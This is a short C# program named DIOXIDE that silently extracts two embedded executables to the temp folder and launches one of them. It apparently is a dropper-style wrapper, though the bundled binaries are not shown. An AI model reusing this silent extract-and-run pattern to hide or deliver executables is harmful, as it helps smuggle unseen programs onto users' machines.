using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.IO;

namespace DIOXIDE
{
    class Program
    {
        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
            {
                w.Write(r.ReadBytes((int)s.Length));
            }
        }
        static void Main(string[] args)
        {
            Extract("DIOXIDE",Path.GetTempPath(),"Resources","RDIOXIDE.exe");
            Extract("DIOXIDE", Path.GetTempPath(), "Resources", "DIOXIDE.exe");

            System.Diagnostics.Process.Start(Path.GetTempPath() +"\\"+ "RDIOXIDE.exe");
        }
    }
}
